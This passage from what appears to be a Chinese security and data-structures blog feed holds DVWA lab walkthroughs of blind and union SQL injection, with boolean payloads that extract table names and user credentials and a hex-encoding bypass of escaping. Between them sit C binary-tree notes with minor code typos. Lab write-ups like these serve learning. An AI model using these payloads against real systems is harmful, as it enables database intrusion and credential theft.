<p><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818154128881.png" alt><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818154100025.png" alt><br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818154232882.png" alt><br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818154251514.png" alt><br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818154320008.png" alt><br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818154350179.png" alt><br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818154414112.png" alt><br>参照ascll，100是d，因为在前面手工注入的时候已经知道名字是dvwa，后面只做验证不做二分法<br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818154550635.png" alt><br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818154702041.png" alt><br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818154729876.png" alt><br>可以看到得到的ascll码为100，118，119，97，转义过来就是d,v,w,a</p>
<h4 id="爆破法"><a href="#爆破法" class="headerlink" title="爆破法"></a>爆破法</h4><p>第一步：抓包送去爆破<br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818171940461.png" alt><br>第二步：更改攻击方式为：集束炸弹（cluster bomb)<br>将抓包中的判断语句&gt;97改为=97，在burp中是16进制表示&gt;的16进制是%3E,=的十六进制是%3D(很重要)，选定爆破范围：第一个轰炸点是sbustr(string,int a,int b)函数的int a位置，第二个位置是所猜测的ascll码位置<br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818172343357.png" alt><br>第三步：设置攻击方式<br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818172408780.png" style="zoom: 67%;"><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818172421304-16609544205811.png" style="zoom: 50%;"><br>如图所示，由上面的步骤知道数据库名共四个字符所以爆破点1的三个参数是1，4，1，爆破点2则是从ascll的0到127遍历，轰炸一边大概要半个小时左右这还是四个字节，所以这也体现出来了工具的重要性，推荐sqlmap，实例看sqlmap使用。配置好了就可以开始爆破了。<br>第四步：得到结果<br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818172743154.png" alt><br>跑了半个小时终于跑出来了，选择length就可以很快找到，可以看到对应的四个字符的ascll分别是100,108,118,119,这与二分法得到的结果是一样的，后面需要猜名字的都可以像这样，但是生命苦短，我选sqlmap一把梭。</p>
<h3 id="判断表的数量"><a href="#判断表的数量" class="headerlink" title="判断表的数量"></a>判断表的数量</h3><p>语法：1’and (select count(*) from information_schema.tables where table_schema=’dvwa’ limit 0,1)=’X （此处不需要limit函数）<br>X为表的数量<br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818161240201.png" alt><br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818161312586.png" alt><br>说明数据库中有两个表</p>
<h3 id="判断表长"><a href="#判断表长" class="headerlink" title="判断表长"></a>判断表长</h3><p>语法：1’and length(substr((select table_name from information_schema.tables where table_schema=’dvwa’ limit a,b),1))&gt;’X<br>a 为从第几行  b 为输出几行数据  limit函数详情见函数库 X为表名长<br>所以第一张表名长<br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818164718463.png" alt><br>第二张表名长<img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818164812015.png" alt></p>
<h3 id="判断表名"><a href="#判断表名" class="headerlink" title="判断表名"></a>判断表名</h3><p>语法：1’and ascii(substr((select table_name from information_schema.tables where table_schema=’dvwa’ limit 0,1),A,1))&gt;’X              A表示第A位，X表示第A位对应的ascll码</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">依次输入</span><br><span class="line">1&#x27;and ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&#x27;dvwa&#x27;</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="string">&#x27;97</span></span><br><span class="line"><span class="string">1&#x27;</span><span class="keyword">and</span> ascii(<span class="built_in">substr</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&#x27;dvwa&#x27;</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&lt;<span class="string">&#x27;122</span></span><br><span class="line"><span class="string">1&#x27;</span><span class="keyword">and</span> ascii(<span class="built_in">substr</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&#x27;dvwa&#x27;</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&lt;<span class="string">&#x27;109</span></span><br><span class="line"><span class="string">1&#x27;</span><span class="keyword">and</span> ascii(<span class="built_in">substr</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&#x27;dvwa&#x27;</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&lt;<span class="string">&#x27;103</span></span><br><span class="line"><span class="string">1&#x27;</span><span class="keyword">and</span> ascii(<span class="built_in">substr</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&#x27;dvwa&#x27;</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&lt;<span class="string">&#x27;105</span></span><br><span class="line"><span class="string">1&#x27;</span><span class="keyword">and</span> ascii(<span class="built_in">substr</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&#x27;dvwa&#x27;</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="string">&#x27;103</span></span><br><span class="line"><span class="string">//利用ascii()和substr()以及limit得出：第一个表的第一个字符为g</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//综上所述，</span></span><br><span class="line"><span class="string">第一个表名为：guestbook</span></span><br><span class="line"><span class="string">第二个表名为：users</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
<p>或者使用爆破</p>
<h3 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h3><p>语法：1’and (select count(*) from information_schema.columns where table_name=’users’)=’11<img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818165921936.png" alt><br>如图所示，dvwa的users表的字段数为：11</p>
<h3 id="判断字段名长"><a href="#判断字段名长" class="headerlink" title="判断字段名长"></a>判断字段名长</h3><p>1’and length(substr((select column_name from information_schema.columns where table_name=’users’ limit 0,1),1))=’7<br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818170155864.png" alt><br>如图所示，条件为表名是users的从information_schema.columns表中查字段名的第一行的数据从第一位开始输出的长度是7，然后就是二分法或者爆破</p>
<h3 id="判断字段名"><a href="#判断字段名" class="headerlink" title="判断字段名"></a>判断字段名</h3><p>语法：1’and ascii(substr((select column_name from information_schema.columns where table_name=’users’ limit 0,1),1,1))=’117<img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818170438584.png" alt><br>如图所示，条件为表名是users的从information_schema.columns表中查字段名的第一行的数据的第一位的ascll是117也就是u，最后得到结果为user_id</p>
<h3 id="判断字段的字段值"><a href="#判断字段的字段值" class="headerlink" title="判断字段的字段值"></a>判断字段的字段值</h3><p>查询users字段的数据<br>语法：1’and (select count(*) from users)=’X         X为该字段内共X条数据<img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818170831417.png" alt><br>如图所示，users表中共5条数据</p>
<p>语法：1’and length(substr((select user from users limit 0,1),1))=’X        X为第一个字段值长度，第二、三个字段值更换limit函数参数<br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818171129966.png" alt><br>如图所示，users字段值中第一个字段值长度为5</p>
<p>语法：1’and ascii(substr((select user from users limit 0,1),1,1))=’X             X为第一个字段值第一个字符的ascll码<br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818171222053.png" alt></p>
<p>注：password表中得到的是md5加密后的结果需要自行解密</p>
]]></content>
      <categories>
        <category>web攻防</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>二叉树</title>
    <url>/2022/08/17/%E4%BA%8C%E5%8F%89%E6%A0%91/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>二叉树的存储结构和链式存储的代码实现、遍历的代码实现和层序遍历构造二叉树的代码实现</p>
<span id="more"></span>
<h2 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h2><p>二叉树是有序树（左右子树不能颠倒）递归定义的数据结构</p>
<p><img src="/2022/08/17/%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220701141656221.png" alt><br><img src="/2022/08/17/%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220701142020842.png" alt><br><img src="/2022/08/17/%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220701142503488.png" alt><br><img src="/2022/08/17/%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709114958544.png" alt></p>
<h3 id="二叉树的存储结构"><a href="#二叉树的存储结构" class="headerlink" title="二叉树的存储结构"></a>二叉树的存储结构</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 100</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span>&#123;</span></span><br><span class="line">    ElemType value;<span class="comment">//结点中的数据元素</span></span><br><span class="line">    <span class="type">bool</span> isEmpty;<span class="comment">//结点是否为空</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">TreeNode t[MaxSize];<span class="comment">//定义一个长度为MaxSize的数组t，按照从上至下从左至右的顺序依次存储完全二叉树的各个结点</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;MaxSize;i++)&#123;</span><br><span class="line">    t[i].isEmpty=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/17/%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709120058958.png" alt><br><img src="/2022/08/17/%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709120134485.png" alt><br><img src="/2022/08/17/%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709120216992.png" alt></p>
<h3 id="二叉树的链式存储"><a href="#二叉树的链式存储" class="headerlink" title="二叉树的链式存储"></a>二叉树的链式存储</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">BiTNode</span>&#123;</span></span><br><span class="line">	ElemType data;                     <span class="comment">//数据域</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">BiTNode</span> *<span class="title">lchild</span>,*<span class="title">rchild</span>;</span>    <span class="comment">//左右孩子指针</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BiTNode</span> *<span class="title">parent</span>;</span>            <span class="comment">//父节点指针（三叉链表——方便找父节点）</span></span><br><span class="line">&#125;BiTNode,*BiTree;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/17/%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709121942852.png" alt></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//定义一颗空树</span></span><br><span class="line">BiTree root =null;</span><br><span class="line"></span><br><span class="line"><span class="comment">//插入根节点</span></span><br><span class="line">root = (BiTree)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(BiTNode));</span><br><span class="line">root-&gt;data = &#123;<span class="number">1</span>&#125;;</span><br><span class="line">root-&gt;lchild = null;</span><br><span class="line">root-&gt;rchild = null;</span><br><span class="line"></span><br><span class="line"><span class="comment">//插入新结点</span></span><br><span class="line">BiTNode * p =(BiTNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(BiTNode));</span><br><span class="line">p-&gt;data = &#123;<span class="number">2</span>&#125;;</span><br><span class="line">p-&gt;lchild = <span class="literal">NULL</span>;</span><br><span class="line">p-&gt;rchild = null;</span><br><span class="line">root-&gt;lchild = p;  <span class="comment">//作为根结点的左孩子</span></span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/17/%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709125146274.png" alt></p>
<h2 id="二叉树的遍历"><a href="#二叉树的遍历" class="headerlink" title="二叉树的遍历"></a>二叉树的遍历</h2><p><img src="/2022/08/17/%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709130230793.png" alt></p>
<p><img src="/2022/08/17/%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709130623105.png" alt></p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//先序遍历</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">PreOrder</span><span class="params">(BiTree T)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T!=null)&#123;</span><br><span class="line">        visit(T);            <span class="comment">//访问根节点</span></span><br><span class="line">        PreOrder(T-&gt;lchild); <span class="comment">//递归遍历左子树</span></span><br><span class="line">        PreOrder(T-&gt;rchild); <span class="comment">//递归遍历右子树0</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//时间复杂度为O(h)</span></span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/17/%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709192542556.png" alt><br>先序遍历——第一次路过时访问结点<br>中序遍历——第二次路过时访问结点<br>后序遍历——第三次路过时访问结点<br><img src="/2022/08/17/%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709192656825.png" alt></p>
<h3 id="求树的深度"><a href="#求树的深度" class="headerlink" title="求树的深度"></a>求树的深度</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">treeDepth</span><span class="params">(BiTree T)</span>&#123;</span><br><span class="line">    IF(T==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="type">int</span> l = treeDepth(T-&gt;lchild);</span><br><span class="line">        <span class="type">int</span> r = treeDepth(T-&gt;rchild);</span><br><span class="line">        <span class="keyword">return</span> l&gt;r? l+<span class="number">1</span>:r+<span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="二叉树的层序遍历"><a href="#二叉树的层序遍历" class="headerlink" title="二叉树的层序遍历"></a>二叉树的层序遍历</h2><p><img src="/2022/08/17/%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709193412735.png" alt></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//二叉树的结点（链式存储）</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">BiTNode</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BiTNode</span> *<span class="title">lchild</span>,*<span class="title">rchild</span>;</span></span><br><span class="line">&#125;BiTNode,*BiTree;</span><br><span class="line"></span><br><span class="line"><span class="comment">//链式队列结点</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LinkNode</span>&#123;</span></span><br><span class="line">    BiTNode * data;           <span class="comment">//存指针而不是结点来节省空间</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">LinkNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;LinkNode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    LinkNode *front,*rear;<span class="comment">//队头队尾指针</span></span><br><span class="line">&#125;LinkQueue;</span><br><span class="line"></span><br><span class="line"><span class="comment">//层序遍历</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">LevelOrder</span><span class="params">(BiTree T)</span>&#123;</span><br><span class="line">    LinkQueue Q;</span><br><span class="line">    InitQueue(Q);  <span class="comment">//初始化</span></span><br><span class="line">    BiTree p;</span><br><span class="line">    EnQueue(Q,T);    <span class="comment">//将根节点入队</span></span><br><span class="line">    <span class="keyword">while</span>(!IsEmpty(Q))&#123;</span><br><span class="line">        DeQueue(Q,p);   <span class="comment">//队头结点出队</span></span><br><span class="line">        visit(p);       <span class="comment">//访问出队结点</span></span><br><span class="line">        <span class="keyword">if</span>(p-&gt;lchild!=null)</span><br><span class="line">            EnQueue(Q,p-&gt;lchild);</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;rchild!=null)</span><br><span class="line">            EnQueue(Q.p-&gt;rchild);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="由遍历序列构造二叉树"><a href="#由遍历序列构造二叉树" class="headerlink" title="由遍历序列构造二叉树"></a>由遍历序列构造二叉树</h2><p>给定一个前中后序遍历序列可能对应多种二叉树<br>给定中序加一种其他序（前序后序层序）对应唯一二叉树</p>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>树与二叉树</tag>
      </tags>
  </entry>
  <entry>
    <title>sql注入</title>
    <url>/2022/08/17/sql%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>SQL是操作数据库数据的结构化查询语言，网页的应用数据和后台数据库中的数据进行交互时会采用SQL。而SQL注入是将Web页面的原URL、表单域或数据包输入的参数，修改拼接成SQL语句，传递给Web服务器，进而传给数据库服务器以执行数据库命令。如Web应用程序的开发人员对用户所输入的数据或cookie等内容不进行过滤或验证(即存在注入点)就直接传输给数据库，就可能导致拼接的SQL被执行，获取对数据库的信息以及提权，发生SQL注入攻击。<br><span id="more"></span></p>
<h2 id="low级别"><a href="#low级别" class="headerlink" title="low级别"></a>low级别</h2><p>首先先看看输出<br><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817105442755.png" alt><br><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817105456531.png" alt><br><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817105510464.png" alt><br>通过代码可以看到表单输入id没有任何过滤<img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817105528953.png" alt></p>
<h3 id="注入点判断"><a href="#注入点判断" class="headerlink" title="注入点判断"></a>注入点判断</h3><p><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817110157425.png" alt><br>受引号闭合影响<br><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817110321644.png" alt><br>或者在url栏输入<br><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817110448845.png" alt><br><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817110527094.png" alt><br>是等价的</p>
<h3 id="判断字段"><a href="#判断字段" class="headerlink" title="判断字段"></a>判断字段</h3><p><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817110631637.png" alt><br>order by 3时报错<br><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817110650685.png" alt><br>2是正确的3返回错误，即有两个字段<br><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817110944135.png" alt></p>
<h3 id="查询数据库名"><a href="#查询数据库名" class="headerlink" title="查询数据库名"></a>查询数据库名</h3><p><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817111143792.png" alt></p>
<h3 id="查询表名"><a href="#查询表名" class="headerlink" title="查询表名"></a>查询表名</h3><p>因为information_schema的排序规则是utf8_general_ci,而dvwa中排序规则是utf8_unicode_ci,需要逐一更改每个字段；或者直接使用16进制读取然后解码</p>
<p><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817112730977.png" alt><br>用burp自带的解码器用ASCLL hex解码<br><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817113057326.png" alt><br><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817113146151.png" alt><br>得到表名是guestbook和users<br>也可以通过group_concat将表名拼接起来<br><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817143345283.png" alt></p>
<h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><p>mysql5.0及以上版本中自带数据库information_schema,用来存储所有数据库名、表名、列名。</p>
<h3 id="查列名"><a href="#查列名" class="headerlink" title="查列名"></a>查列名</h3><p><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817143842352.png" alt><br>ASCLL hex解密<br><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817144040718.png" alt></p>
<h3 id="查询自己想知道的"><a href="#查询自己想知道的" class="headerlink" title="查询自己想知道的"></a>查询自己想知道的</h3><p>比如user、password<br><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817144933961.png" alt><br>使用md5解密第一个来验证，确实是登录时候用的账号密码<br><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817145151291.png" alt></p>
<h2 id="medium级别"><a href="#medium级别" class="headerlink" title="medium级别"></a>medium级别</h2><p><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817145813710.png" alt></p>
<p>可以看到他不给写东西了只可以下来表单，通过burp来进行sql注入，步骤和上面一样，注入位置是抓到的包的id，下图最后一行<br><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817145942734.png" alt></p>
<h3 id="注入点判断-1"><a href="#注入点判断-1" class="headerlink" title="注入点判断"></a>注入点判断</h3><p><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817150024751.png" alt><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817150059469.png" style="zoom:50%;"></p>
<h3 id="判断字段-1"><a href="#判断字段-1" class="headerlink" title="判断字段"></a>判断字段</h3><p><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817150519477.png" alt><br><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817150647418.png" alt><br>没返回错误代表有两个字段<br><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817150754237.png" alt><br><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817150802608.png" alt><br>证明字段数为2</p>
<h3 id="获取数据库名"><a href="#获取数据库名" class="headerlink" title="获取数据库名"></a>获取数据库名</h3><p><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817151035776.png" alt><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817150945392.png" alt></p>
<h3 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h3><p><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817151935877.png" alt><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817151734964.png" alt></p>
<p>这里table_schema=’dvwa’变成了0x64767761是因为源代码中有mysqli_real_escape_string函数，会将特殊符号转义，可以通过将引号内的内容转换成16进制跳过该函数</p>
<h3 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h3><p><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817152559684.png" alt><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817152530263.png" alt></p>
<h3 id="获取想知道的"><a href="#获取想知道的" class="headerlink" title="获取想知道的"></a>获取想知道的</h3><p><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817152859329.png" alt><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817152916391.png" alt></p>
<h2 id="high级别"><a href="#high级别" class="headerlink" title="high级别"></a>high级别</h2><p>跳转到另一个页面</p>
<p><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817153035328.png" alt><br>经过多次尝试发现语法和low级别是一样的<br>源代码中多了limit函数限制一行输出，只要#注释掉就ok，应该是用来防治sqlmap一把梭的</p>
<h2 id="impossible级别"><a href="#impossible级别" class="headerlink" title="impossible级别"></a>impossible级别</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    <span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Was a number entered?</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>( <span class="variable">$id</span> )) &#123;</span><br><span class="line">        <span class="comment">// Check the database</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>( <span class="string">&#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27;</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">&#x27;:id&#x27;</span>, <span class="variable">$id</span>, PDO::<span class="variable constant_">PARAM_INT</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Make sure only 1 result is returned</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">rowCount</span>() == <span class="number">1</span> ) &#123;</span><br><span class="line">            <span class="comment">// Get values</span></span><br><span class="line">            <span class="variable">$first</span> = <span class="variable">$row</span>[ <span class="string">&#x27;first_name&#x27;</span> ];</span><br><span class="line">            <span class="variable">$last</span>  = <span class="variable">$row</span>[ <span class="string">&#x27;last_name&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line"><span class="title function_ invoke__">generateSessionToken</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>和暴力破解的impossible一样都使用了PDO技术，划清了代码与数据的界限，有效防御sql注入，同时只有返回查询的结果数量为1时才会成功输出，而Anti-CSRFtoken的加入进一步提高了安全性</p>
]]></content>
      <categories>
        <category>web攻防</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>树和森林</title>
    <url>/2022/08/16/%E6%A0%91%E5%92%8C%E6%A3%AE%E6%9E%97/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>树的基本概念，有序树与无序树、森林以及其性质</p>
<span id="more"></span>
<h2 id="树的基本概念"><a href="#树的基本概念" class="headerlink" title="树的基本概念"></a>树的基本概念</h2><p>非空树：有且仅有一个根节点</p>
<p><img src="/2022/08/16/%E6%A0%91%E5%92%8C%E6%A3%AE%E6%9E%97/image-20220629122020259.png" style="zoom:67%;"></p>
<p>空树：节点数为0的树<br>没有后继的结点成为叶子节点（终端节点）<br><strong>除了根节点之外有且仅有一个前驱</strong></p>
<h3 id="子树"><a href="#子树" class="headerlink" title="子树"></a>子树</h3><p><img src="/2022/08/16/%E6%A0%91%E5%92%8C%E6%A3%AE%E6%9E%97/image-20220629122304793.png" alt></p>
<p>子树互不相交</p>
